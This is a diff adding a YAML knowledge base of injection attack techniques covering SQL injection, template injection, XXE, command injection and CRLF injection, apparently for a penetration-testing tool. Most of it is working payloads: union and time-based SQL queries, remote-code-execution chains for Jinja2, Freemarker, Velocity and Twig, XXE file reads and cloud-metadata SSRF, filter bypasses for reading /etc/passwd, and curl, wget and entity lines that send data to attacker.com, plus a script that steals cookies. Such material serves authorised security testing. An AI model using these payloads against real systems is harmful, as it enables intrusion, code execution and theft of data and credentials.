@@ -1,0 +1,319 @@
+# Injection Attack Techniques — SQLi, SSTI, XXE, Command Injection, CRLF, LDAP
+# Category: injection
+
+- title: "SQL Injection — Complete Testing Methodology"
+  content: |
+    ## SQL Injection Testing Flow
+
+    ### Phase 1: Detection
+    ```
+    '           → error
+    "           → error
+    ' OR '1'='1 → bypass
+    ' AND '1'='2 → false result
+    1' OR '1'='1 -- → comment
+    ```
+
+    ### Phase 2: Column Count
+    ```
+    ' ORDER BY 1 --
+    ' ORDER BY 2 --
+    ' ORDER BY 3 -- (until error → n-1 columns)
+    ```
+
+    ### Phase 3: Union-Based Extraction
+    ```
+    ' UNION SELECT 1,2,3,...n --
+    ' UNION SELECT NULL,@@version,NULL -- (use nulls for incompatible types)
+    ```
+
+    ### Phase 4: Database Enumeration
+    **MySQL:**
+    ```sql
+    SELECT @@version, database(), user()
+    SELECT table_name FROM information_schema.tables WHERE table_schema=database()
+    SELECT column_name FROM information_schema.columns WHERE table_name='users'
+    ```
+
+    **PostgreSQL:**
+    ```sql
+    SELECT version(), current_database(), current_user
+    SELECT tablename FROM pg_catalog.pg_tables
+    SELECT column_name FROM information_schema.columns WHERE table_name='users'
+    ```
+
+    **MSSQL:**
+    ```sql
+    SELECT @@version, db_name(), user_name()
+    SELECT name FROM sys.tables
+    SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users')
+    ```
+
+    ### Phase 5: Blind SQLi
+    ```sql
+    ' AND 1=1 -- (true → normal response)
+    ' AND 1=2 -- (false → different response)
+    ' AND SLEEP(5) -- (time-based, MySQL)
+    ' AND pg_sleep(5) -- (time-based, PostgreSQL)
+    WAITFOR DELAY '0:0:5' -- (time-based, MSSQL)
+    ```
+
+    ### Phase 6: Out-of-Band (OOB)
+    ```sql
+    -- MySQL (Windows)
+    SELECT LOAD_FILE('\\\\attacker.com\\share\\data')
+    -- PostgreSQL
+    COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'
+    -- MSSQL
+    EXEC master..xp_dirtree '\\attacker.com\share'
+    ```
+  tags: [sql-injection, sqli, blind-sqli, union, error-based, time-based, oob]
+  keywords: [sql注入, 联合查询, 盲注, 报错注入, 时间盲注, 外带数据, 数据库枚举]
+  severity: critical
+  references:
+    - https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+- title: "SSTI (Server-Side Template Injection) — Detection & Exploitation"
+  content: |
+    ## SSTI Detection & RCE
+
+    ### Detection Polyglots
+    ```
+    ${{<[%'"}}%\
+    {{7*7}}
+    ${7*7}
+    #{7*7}
+    <%= 7*7 %>
+    ${{7*7}}
+    @(7*7)         <!-- Razor -->
+    ```
+
+    ### Engine Identification
+
+    | Expression | Engine |
+    |------------|--------|
+    | `{{7*7}}` → 49 | Jinja2/Twig |
+    | `{{7*'7'}}` → 7777777 | Jinja2 |
+    | `${{7*7}}` → 49 | Freemarker |
+    | `#{7*7}` → 49 | Freemarker |
+    | `${7*7}` → 49 | Velocity |
+    | `{{=7*7}}` → 49 | doT |
+    | `{7*7}` → 49 | Pug/Jade |
+
+    ### Jinja2 (Python) RCE
+    ```python
+    # Classic RCE
+    {{ ''.__class__.__mro__[1].__subclasses__() }}
+
+    # Popen chain
+    {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+
+    # Short payload (Python3)
+    {{ lipsum.__globals__.os.popen('id').read() }}
+
+    # Filter bypass (if _ blocked)
+    {{ request|attr('application')|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)() }}
+    ?a=__globals__&b=__getitem__&c=__builtins__&d=__import__('os')&e=popen('id')&f=read()
+    ```
+
+    ### Freemarker (Java) RCE
+    ```java
+    // Execute command
+    ${"freemarker.template.utility.Execute"?new()("id")}
+
+    // Read file
+    ${"freemarker.template.utility.ObjectConstructor"?new()("java.io.FileReader","/etc/passwd")}
+    ```
+
+    ### Velocity (Java) RCE
+    ```java
+    #set($cmd="id")
+    #set($runtime=$class.forName("java.lang.Runtime").getRuntime())
+    $runtime.exec($cmd)
+    ```
+
+    ### Twig (PHP) RCE
+    ```php
+    {{_self.env.registerUndefinedFilterCallback("exec")}}
+    {{_self.env.getFilter("id")}}
+    ```
+
+    ### Spring Boot 3.3.4 Bypass
+    - Filter blocks common keywords
+    - Use `lipsum` or `lipsum.__globals__` if `__class__` blocked
+    - Chain through `request.application` for dynamic access
+  tags: [ssti, template-injection, jinja2, freemarker, velocity, twig, rce]
+  keywords: [ssti, 模板注入, ssti检测, jinja2 rce, freemarker利用, 模板引擎识别, Spring Boot绕过]
+  severity: critical
+  references:
+    - https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+
+- title: "XXE (XML External Entity) Injection"
+  content: |
+    ## XXE Attack Patterns
+
+    ### Basic XXE
+    ```xml
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    ]>
+    <root>&xxe;</root>
+    ```
+
+    ### Blind XXE (Out-of-Band)
+    ```xml
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "http://attacker.com/collect?data=">
+    ]>
+    <root>&xxe;</root>
+    ```
+
+    ### SSRF via XXE
+    ```xml
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+    ]>
+    <root>&xxe;</root>
+    ```
+
+    ### Parameter Entity (Blind Exfiltration)
+    ```xml
+    <!DOCTYPE foo [
+      <!ENTITY % file SYSTEM "file:///etc/passwd">
+      <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+      %dtd;
+    ]>
+    ```
+    evil.dtd:
+    ```xml
+    <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?%file;'>">
+    %all;
+    ```
+
+    ### XXE in Various Formats
+    - **SVG**: `<svg><style>&xxe;</style></svg>`
+    - **SOAP**: XXE in SOAP request body
+    - **DOCX/XLSX**: ZIP → `word/document.xml` → XXE injection
+    - **PDF**: XXE in XFA forms
+    - **RSS/Atom**: XXE in feed XML
+
+    ### PHP Specific
+    ```xml
+    <!-- expect:// wrapper (if enabled) -->
+    <!ENTITY xxe SYSTEM "expect://id">
+
+    <!-- phar:// wrapper chain -->
+    <!ENTITY xxe SYSTEM "phar:///path/to/evil.phar">
+    ```
+  tags: [xxe, xml, file-read, ssrf, blind-xxe, oob, svg, soap]
+  keywords: [xxe, xml外部实体, xxe盲打, 文件读取, ssrf, 参数实体, xxe利用]
+  severity: high
+
+- title: "Command Injection — OS Command Execution"
+  content: |
+    ## Command Injection Methodology
+
+    ### Sink Functions by Language
+    **PHP:**
+    ```php
+    exec(), system(), shell_exec(), passthru(), popen(), proc_open()
+    `` (backticks), pcntl_exec()
+    ```
+
+    **Python:**
+    ```python
+    os.system(), os.popen(), subprocess.call(), subprocess.Popen()
+    os.exec*() functions
+    ```
+
+    **Node.js:**
+    ```js
+    child_process.exec(), child_process.spawn(), child_process.fork()
+    require('child_process').execSync()
+    ```
+
+    ### Detection
+    ```
+    ; id
+    | id
+    || id
+    & id
+    && id
+    `id`
+    $(id)
+    %0a id  (newline injection)
+    %0d%0a id  (CRLF)
+    ```
+
+    ### Bypass Filters
+    ```
+    # Space bypass
+    cat${IFS}/etc/passwd    → ${IFS} = internal field separator
+    cat$IFS/etc/passwd
+    cat</etc/passwd          → redirect instead of space
+    {cat,/etc/passwd}        → brace expansion
+
+    # Slash bypass
+    cat${HOME:0:1}etc${HOME:0:1}passwd
+    # Keyword bypass
+    c\at /etc/passwd         → backslash escape
+    /???/c?t /???/p?sswd    → wildcard
+    `echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`  → base64
+    ```
+
+    ### Blind Command Injection
+    ```
+    ; sleep 5              → time-based
+    ; ping -c 5 attaker.com → oob
+    ; curl http://attacker.com/$(whoami)  → exfiltration
+    ; wget http://attacker.com/$(id | base64)
+    ```
+  tags: [command-injection, rce, os-command, bypass, filter-evasion, blind]
+  keywords: [命令注入, 命令执行, rce, 空格绕过, 盲命令注入, os命令执行]
+  severity: critical
+
+- title: "CRLF Injection & HTTP Response Splitting"
+  content: |
+    ## CRLF Injection Techniques
+
+    ### Basics
+    CRLF = `%0d%0a` (Carriage Return + Line Feed)
+
+    ### Header Injection
+    ```
+    /path?redirect=/valid%0d%0aSet-Cookie:evil=1
+    /path?param=value%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK
+    ```
+
+    ### HTTP Response Splitting
+    ```
+    GET /api?q=%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
+    ```
+
+    ### Cache Poisoning via CRLF
+    1. Inject headers that affect caching
+    2. `X-Cache: HIT` for the poisoned response
+    3. All subsequent visitors get poisoned content
+
+    ### Cookie Injection
+    ```
+    %0d%0aSet-Cookie:session=attacker_value;Path=/
+    %0d%0aSet-Cookie:admin=true
+    ```
+
+    ### Log Injection
+    ```
+    # Inject into log files that are viewed via web
+    username=%0d%0aAdmin logged in successfully
+    username=<script>fetch('http://attacker/?c='+document.cookie)</script>
+    ```
+
+    ### CORS Header Injection
+    ```
+    %0d%0aAccess-Control-Allow-Origin:*
+    %0d%0aAccess-Control-Allow-Credentials:true
+    ```
+  tags: [crlf, http-response-splitting, header-injection, cache-poisoning, log-injection]
+  keywords: [crlf, 响应分割, http头注入, 缓存投毒, 日志注入, cookie注入]
+  severity: medium
